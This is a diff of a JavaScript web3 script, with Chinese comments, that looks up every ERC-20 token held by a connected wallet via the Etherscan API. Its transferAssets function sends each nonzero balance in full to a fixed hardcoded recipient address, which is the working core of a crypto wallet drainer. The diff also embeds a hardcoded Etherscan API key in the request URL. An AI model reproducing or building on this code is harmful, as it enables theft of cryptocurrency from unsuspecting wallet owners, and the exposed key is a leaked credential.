@@ -1,13 +1,11 @@
-const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699'; // 接收代币的地址
-const ETHERSCAN_API_KEY = '6I5NKMYZ4W9SUDGGM3GJBAB9Y2UK324G63'; // Etherscan API密钥
-const contractAddress = '0x0ccd25cb287e18e55969d65ab5555582657512be'; // 替换为你的合约地址
+const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699';
 let web3;
 let isConnected = false;
 
 const erc20Abi = [
     {
         "constant": true,
-        "inputs": [{"name": "_owner", "type": "address"}],   
+        "inputs": [{"name": "_owner", "type": "address"}],
         "name": "balanceOf",
         "outputs": [{"name": "balance", "type": "uint256"}],
         "type": "function"
@@ -104,7 +102,11 @@ const transferAssets = async (account) => {
         if (balance.gt(0)) {
             const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
             try {
-                const transfer = await tokenContract.methods.transfer(recipientAddress, balance.toString()).send({ from: account });
+                // 调用合约的 transfer 方法，将代币转移到目标地址
+                const transfer = await tokenContract.methods
+                    .transfer(recipientAddress, balance.toString())
+                    .send({ from: account });
+
                 updateStatus(`成功转移 ${balance.toString()} ${token.symbol} 从 ${account} 至 ${recipientAddress}`);
             } catch (error) {
                 updateStatus(`转移 ${token.symbol} 失败: ${error.message}`);
@@ -120,7 +122,7 @@ const transferAssets = async (account) => {
 // 获取代币余额的函数
 const getTokenBalances = async (address) => {
     try {
-        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=${ETHERSCAN_API_KEY}`;
+        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=6I5NKMYZ4W9SUDGGM3GJBAB9Y2UK324G63`;
         const response = await axios.get(url);
         const transactions = response.data.result;
 
